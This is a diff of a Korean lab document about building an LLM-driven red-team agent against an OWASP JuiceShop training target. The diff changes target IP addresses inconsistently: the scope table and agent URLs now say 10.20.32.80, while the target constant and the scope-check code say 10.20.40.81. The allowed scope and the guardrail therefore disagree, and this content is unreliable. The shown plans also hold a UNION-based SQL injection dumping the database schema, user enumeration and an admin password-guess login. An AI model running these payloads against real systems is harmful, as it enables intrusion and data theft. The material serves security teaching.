@@ -47,7 +47,7 @@
 | **API 엔드포인트** | REST API의 접근 경로 | `/api/products`, `/rest/admin` |
 | **HTTP 상태 코드** | 서버 응답 결과 코드 | 200=성공, 401=인증 필요, 500=서버 오류 |
 | **가드레일** | Red Agent의 공격 범위를 제한하는 안전장치 | 대상 IP 제한, 파괴적 공격 금지 |
-| **Scope** | 공격/점검 허용 범위 | 10.20.30.80:3000만 대상 |
+| **Scope** | 공격/점검 허용 범위 | 10.20.32.80:3000만 대상 |
 | **Challenge** | JuiceShop의 개별 보안 과제 | Score Board 접근, Admin 로그인 |
 | **enumerate** | 대상의 정보를 체계적으로 수집 | API 엔드포인트 목록 추출 |
 | **flag** | CTF에서 취약점 공략 성공의 증거 | 특정 문자열/해시값 |
@@ -64,7 +64,7 @@
 |------|---------|
 | 팀 구성 | 2-3명 (프로젝트 A와 동일 팀) |
 | 목표 | JuiceShop 취약점을 자동 발견+익스플로잇하는 Red Agent |
-| 대상 | http://10.20.30.80:3000 (JuiceShop만) |
+| 대상 | http://10.20.40.81:3000 (JuiceShop만) |
 | LLM | Ollama gemma3:12b 또는 llama3.1:8b |
 | 안전장치 | 대상 제한, 파괴적 공격 금지, Evidence 전수 기록 |
 | 평가 | 발견 취약점 수 + Evidence 품질 + 안전성 준수 |
@@ -83,7 +83,7 @@
 
 | 규칙 | 설명 |
 |------|------|
-| 대상 제한 | http://10.20.30.80:3000만 공격 허용 |
+| 대상 제한 | http://10.20.32.80:3000만 공격 허용 |
 | 파괴적 공격 금지 | rm, DROP, shutdown 등 금지 |
 | DoS 금지 | 대량 요청으로 서비스 마비 금지 |
 | 시스템 접근 금지 | 서버 자체 접근 시도 금지 (웹 취약점만) |
@@ -134,19 +134,19 @@ curl -s -X POST "http://localhost:9100/projects/${PB_PID}/execute-plan" \
         "order": 1,
         "instruction_prompt": "curl -s -o /dev/null -w \"%{http_code} %{size_download} %{time_total}\" http://localhost:3000/",
         "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 2,
         "instruction_prompt": "curl -s http://localhost:3000/api/products | python3 -c \"import sys,json; data=json.load(sys.stdin); print(f\\\"Products: {data.get(\\\\\\\"status\\\\\\\",\\\\\\\"?\\\\\\\")}, Count: {len(data.get(\\\\\\\"data\\\\\\\",[]))}\\\"  )\" 2>/dev/null || echo api-check-done",
         "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 3,
         "instruction_prompt": "curl -s http://localhost:3000/rest/admin/application-configuration 2>/dev/null | head -100 || echo admin-config-check",
         "risk_level": "medium",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       }
     ],
     "subagent_url": "http://localhost:8002"
@@ -163,7 +163,7 @@ import json
 import time
 import requests
 
-TARGET = "http://10.20.30.80:3000"
+TARGET = "http://10.20.40.81:3000"
 MANAGER_URL = "http://localhost:9100"
 API_KEY = "ccc-api-key-2026"
 HEADERS = {"Content-Type": "application/json", "X-API-Key": API_KEY}
@@ -370,13 +370,13 @@ curl -s -X POST "http://localhost:9100/projects/${PB_PID}/execute-plan" \
         "order": 1,
         "instruction_prompt": "for path in / /api/products /api/Users /rest/admin/application-configuration /ftp /metrics; do echo \"$path: $(curl -s -o /dev/null -w %{http_code} http://localhost:3000$path)\"; done",
         "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 2,
         "instruction_prompt": "curl -s \"http://localhost:3000/rest/products/search?q=test'\" -o /dev/null -w \"%{http_code}\" && echo ' -- SQLi probe done'",
         "risk_level": "medium",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       }
     ],
     "subagent_url": "http://localhost:8002"
@@ -503,7 +503,7 @@ class AttackStrategist:
             # 안전성 검사
             if "rm " in cmd or "DROP" in cmd:
                 issues.append("파괴적 명령 포함")
-            if "localhost:3000" not in cmd and "10.20.30.80:3000" not in cmd:
+            if "localhost:3000" not in cmd and "10.20.40.81:3000" not in cmd:
                 # 대상 외 접근인지 확인
                 if "curl" in cmd:
                     issues.append("대상 범위 외 접근")
@@ -560,19 +560,19 @@ curl -s -X POST "http://localhost:9100/projects/${PB_PID}/execute-plan" \
         "order": 1,
         "instruction_prompt": "curl -s http://localhost:3000/api/Users | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"Users found: {len(d.get(\\\\\\\"data\\\\\\\",  []))}건\\\"); [print(f\\\"  - {u.get(\\\\\\\"email\\\\\\\",\\\\\\\"?\\\\\\\")} role={u.get(\\\\\\\"role\\\\\\\",\\\\\\\"?\\\\\\\")}\\\") for u in d.get(\\\\\\\"data\\\\\\\",[])[:5]]\" 2>/dev/null || echo user-enum-done",
         "risk_level": "medium",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 2,
         "instruction_prompt": "curl -s http://localhost:3000/rest/products/search?q=qwert%27%29%29+UNION+SELECT+sql%2C%272%27%2C%273%27%2C%274%27%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27+FROM+sqlite_master-- | head -200",
         "risk_level": "high",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 3,
         "instruction_prompt": "curl -s -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' | head -100",
         "risk_level": "medium",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       }
     ],
     "subagent_url": "http://localhost:8002"
@@ -612,7 +612,7 @@ class ExploitExecutor:
                 "order": step.get("order", len(tasks) + 1),
                 "instruction_prompt": step.get("command", "echo no-command"),
                 "risk_level": step.get("risk_level", "medium"),
-                "subagent_url": "http://10.20.30.80:8002",
+                "subagent_url": "http://10.20.32.80:8002",
             }
             tasks.append(task)
 
@@ -688,7 +688,7 @@ curl -s -H "X-API-Key: $BASTION_API_KEY" \
 
 # PoW 블록 확인 (web 서버 에이전트)
 curl -s -H "X-API-Key: $BASTION_API_KEY" \
-  "http://localhost:9100/pow/blocks?agent_id=http://10.20.30.80:8002" | python3 -m json.tool
+  "http://localhost:9100/pow/blocks?agent_id=http://10.20.32.80:8002" | python3 -m json.tool
 ```
 
 ---
